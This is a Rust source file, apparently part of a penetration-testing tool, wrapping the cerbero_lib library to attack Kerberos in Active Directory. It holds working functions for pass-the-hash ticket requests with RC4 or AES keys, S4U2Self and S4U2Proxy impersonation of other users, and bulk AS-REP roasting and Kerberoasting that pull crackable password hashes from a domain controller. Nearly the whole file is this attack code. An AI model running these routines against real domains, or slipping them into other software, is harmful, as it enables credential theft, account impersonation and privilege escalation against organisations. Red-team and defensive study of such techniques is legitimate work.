// Cerberos Kerberos Operations

use cerbero_lib::{
    new_krb_channel, CrackFormat, CredFormat, FileVault, KdcComm, Kdcs, KrbUser,
    Result as CerberoResult, TransportProtocol,
};
use kerberos_crypto::Key;
use std::net::IpAddr;

pub struct KerberosOps {
    domain: String,
    dc_ip: IpAddr,
    protocol: TransportProtocol,
}

impl KerberosOps {
    pub fn new(domain: &str, dc_ip: IpAddr) -> Self {
        Self {
            domain: domain.to_string(),
            dc_ip,
            protocol: TransportProtocol::TCP,
        }
    }

    pub fn set_protocol(&mut self, protocol: TransportProtocol) {
        self.protocol = protocol;
    }

    fn create_kdccomm(&self) -> KdcComm {
        let mut kdcs = Kdcs::new();
        kdcs.insert(self.domain.clone(), self.dc_ip);
        KdcComm::new(kdcs, self.protocol)
    }

    pub fn ask_tgt(
        &mut self,
        username: &str,
        password: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!("[*] Requesting TGT for {}@{}", username, self.domain);

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            None,
            None,
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] TGT saved to: {}", output_file);
        Ok(())
    }

    pub fn ask_tgs(
        &mut self,
        username: &str,
        password: &str,
        service: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!("[*] Requesting service ticket for: {}", service);

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            None,
            Some(service.to_string()),
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] Service ticket saved to: {}", output_file);
        Ok(())
    }

    pub fn ask_tgt_hash(
        &mut self,
        username: &str,
        hash: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());

        let user_key =
            if hash.len() == 32 {
                let key_bytes = hex::decode(hash)
                    .map_err(|_| cerbero_lib::Error::String("Invalid RC4 hash".to_string()))?;
                Key::RC4Key(key_bytes.try_into().map_err(|_| {
                    cerbero_lib::Error::String("Invalid RC4 hash length".to_string())
                })?)
            } else if hash.len() == 64 {
                let key_bytes = hex::decode(hash)
                    .map_err(|_| cerbero_lib::Error::String("Invalid AES256 hash".to_string()))?;
                Key::AES256Key(key_bytes.try_into().map_err(|_| {
                    cerbero_lib::Error::String("Invalid AES256 hash length".to_string())
                })?)
            } else {
                return Err(cerbero_lib::Error::String(
                    "Hash must be 32 (RC4) or 64 (AES256) hex characters".to_string(),
                ));
            };

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!(
            "[*] Requesting TGT for {}@{} using hash",
            username, self.domain
        );

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            None,
            None,
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] TGT saved to: {}", output_file);
        Ok(())
    }

    pub fn ask_s4u2self(
        &mut self,
        username: &str,
        password: &str,
        impersonate_user: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let imp_user = KrbUser::new(impersonate_user.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!(
            "[*] Requesting S4U2Self for {} impersonating {}",
            username, impersonate_user
        );

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            Some(imp_user),
            None,
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] S4U2Self ticket saved to: {}", output_file);
        Ok(())
    }

    pub fn ask_s4u2proxy(
        &mut self,
        username: &str,
        password: &str,
        impersonate_user: &str,
        service: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let imp_user = KrbUser::new(impersonate_user.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!(
            "[*] Requesting S4U2Proxy for {} impersonating {} to {}",
            username, impersonate_user, service
        );

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            Some(imp_user),
            Some(service.to_string()),
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] S4U2Proxy ticket saved to: {}", output_file);
        Ok(())
    }

    pub fn asreproast_user(
        &self,
        username: &str,
        crack_format: CrackFormat,
    ) -> CerberoResult<String> {
        println!("[*] AS-REP roasting {}", username);

        let channel = new_krb_channel(self.dc_ip, self.protocol);
        let user = KrbUser::new(username.to_string(), self.domain.clone());

        let as_rep = cerbero_lib::request_as_rep(&*channel, user, None, None, None)?;

        let hash = cerbero_lib::as_rep_to_crack_string(username, &as_rep, crack_format);
        println!("[+] Hash extracted for {}", username);

        Ok(hash)
    }

    pub fn asreproast_file(
        &self,
        userfile: &str,
        crack_format: CrackFormat,
    ) -> CerberoResult<Vec<String>> {
        use std::fs::File;
        use std::io::{BufRead, BufReader};

        let file = File::open(userfile)
            .map_err(|e| cerbero_lib::Error::String(format!("Failed to open file: {}", e)))?;

        let usernames: Vec<String> = BufReader::new(file)
            .lines()
            .filter_map(|line| line.ok())
            .filter(|line| !line.trim().is_empty())
            .collect();

        println!(
            "[*] AS-REP roasting {} users from {}",
            usernames.len(),
            userfile
        );

        let mut hashes = Vec::new();
        let channel = new_krb_channel(self.dc_ip, self.protocol);

        for username in usernames {
            let user = KrbUser::new(username.clone(), self.domain.clone());

            match cerbero_lib::request_as_rep(&*channel, user, None, None, None) {
                Ok(as_rep) => {
                    let hash =
                        cerbero_lib::as_rep_to_crack_string(&username, &as_rep, crack_format);
                    println!("[+] {} → hash extracted", username);
                    hashes.push(hash);
                }
                Err(_) => {
                    // User requires pre-auth or doesn't exist, skip silently
                }
            }
        }

        if hashes.is_empty() {
            println!("[!] No vulnerable users found (all require pre-authentication)");
        } else {
            println!("[+] Found {} vulnerable user(s)", hashes.len());
        }

        Ok(hashes)
    }

    pub fn kerberoast_service(
        &mut self,
        username: &str,
        password: &str,
        target_user: &str,
        spn: &str,
        crack_format: CrackFormat,
    ) -> CerberoResult<String> {
        println!("[*] Kerberoasting {} ({})", target_user, spn);

        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());
        let kdccomm = self.create_kdccomm();

        let channel = new_krb_channel(self.dc_ip, self.protocol);
        let tgt = cerbero_lib::request_tgt(user.clone(), &user_key, None, None, &*channel)?;

        let service_name = cerbero_lib::core::forge::new_nt_srv_inst(spn);
        let mut kdccomm_mut = kdccomm;
        let tgs = cerbero_lib::request_regular_tgs(
            user,
            service_name.clone(),
            tgt,
            None,
            &mut kdccomm_mut,
        )?;

        let hash = cerbero_lib::tgs_to_crack_string(
            target_user,
            &service_name.to_string(),
            &tgs.ticket,
            crack_format,
        );

        println!("[+] Hash extracted for {}", target_user);
        Ok(hash)
    }

    pub fn kerberoast_file(
        &mut self,
        username: &str,
        password: &str,
        targets_file: &str,
        crack_format: CrackFormat,
    ) -> CerberoResult<Vec<String>> {
        use std::fs::File;
        use std::io::{BufRead, BufReader};

        let file = File::open(targets_file)
            .map_err(|e| cerbero_lib::Error::String(format!("Failed to open file: {}", e)))?;

        let lines: Vec<String> = BufReader::new(file)
            .lines()
            .filter_map(|line| line.ok())
            .filter(|line| !line.trim().is_empty())
            .collect();

        println!(
            "[*] Kerberoasting {} targets from {}",
            lines.len(),
            targets_file
        );

        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        let channel = new_krb_channel(self.dc_ip, self.protocol);
        let tgt = cerbero_lib::request_tgt(user.clone(), &user_key, None, None, &*channel)?;

        let mut hashes = Vec::new();

        for line in lines {
            let (target_user, target_domain, spn) = parse_kerberoast_line(&line, &self.domain)?;

            let service_name = if let Some(s) = spn {
                cerbero_lib::core::forge::new_nt_srv_inst(&s)
            } else {
                // Use NT-ENTERPRISE principal
                let target_krb_user = KrbUser::new(target_user.clone(), target_domain.clone());
                cerbero_lib::core::forge::new_nt_enterprise(&target_krb_user)
            };

            let mut kdccomm = self.create_kdccomm();

            match cerbero_lib::request_regular_tgs(
                user.clone(),
                service_name.clone(),
                tgt.clone(),
                None,
                &mut kdccomm,
            ) {
                Ok(tgs) => {
                    let hash = cerbero_lib::tgs_to_crack_string(
                        &target_user,
                        &service_name.to_string(),
                        &tgs.ticket,
                        crack_format,
                    );
                    println!("[+] {} → hash extracted", target_user);
                    hashes.push(hash);
                }
                Err(e) => {
                    eprintln!("[!] {} → failed: {}", target_user, e);
                }
            }
        }

        if hashes.is_empty() {
            println!("[!] No hashes extracted");
        } else {
            println!("[+] Extracted {} hash(es)", hashes.len());
        }

        Ok(hashes)
    }
}

/// Parse kerberoast line formats:
/// - user
/// - domain/user
/// - user:spn
/// - domain/user:spn
fn parse_kerberoast_line(
    line: &str,
    default_domain: &str,
) -> CerberoResult<(String, String, Option<String>)> {
    let parts: Vec<&str> = line.split(':').collect();

    let user_part = parts[0];
    let spn = if parts.len() > 1 {
        Some(parts[1..].join(":"))
    } else {
        None
    };

    let user_parts: Vec<&str> = user_part.split(&['/', '\\'][..]).collect();

    let (domain, user) = match user_parts.len() {
        1 => (default_domain.to_string(), user_parts[0].to_string()),
        2 => (user_parts[0].to_string(), user_parts[1].to_string()),
        _ => {
            return Err(cerbero_lib::Error::String(format!(
                "Invalid format: {}",
                line
            )));
        }
    };

    Ok((user, domain, spn))
}
